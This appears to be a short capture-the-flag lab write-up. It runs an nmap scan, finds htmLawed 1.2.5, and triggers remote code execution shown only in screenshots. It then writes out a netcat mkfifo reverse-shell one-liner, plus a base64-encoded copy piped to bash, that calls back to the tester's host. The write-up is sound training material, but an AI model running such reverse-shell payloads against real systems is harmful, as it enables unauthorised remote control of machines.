## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Tue Feb 20 14:22:09 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 22,80 -Pn 192.168.239.190
Nmap scan report for 192.168.239.190
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: htmLawed (1.2.5) test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 14:22:25 2024 -- 1 IP address (1 host up) scanned in 16.09 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/566e82a0-d864-46f8-9119-546ae6e7bcc5)

a web server is runing on port `80` opening it on a browser, we can see it is running `htmlawed 1.2.5`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/18e08424-2514-427b-af39-b045282b4990)

after some research found out that it is vuln to RCE by abusing some functions in the settings.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/84c43fe6-8cca-4d09-987d-ad6caa52fc33)

intercept with burp and forward. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/791b4b98-ba67-415a-9179-7a334d292d01)

we triggered RCE. now let's get a reverse shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 80 >/tmp/f

#base64 encode
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y=

echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y= | base64 -d|bash
```



![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/60c697de-2254-4e09-b05f-666ce18183f8)

